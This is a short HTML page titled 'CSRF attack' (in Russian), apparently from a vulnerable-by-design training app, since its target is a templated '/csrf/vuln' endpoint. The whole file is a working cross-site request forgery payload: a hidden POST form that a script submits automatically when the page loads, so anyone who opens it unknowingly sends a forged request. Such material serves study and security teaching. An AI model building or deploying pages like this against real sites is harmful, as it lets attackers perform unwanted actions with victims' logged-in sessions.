<!DOCTYPE html>
<html>
<head>
    <title>CSRF атака</title>
</head>
<body>
    <h1>CSRF атака</h1>
    <form id="csrf-form" method="post" action="{{ home_url }}/csrf/vuln">
    </form>
    <script>
        // Отправляем форму при загрузке страницы
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("csrf-form").submit();
        });
    </script>
</body>
</html>
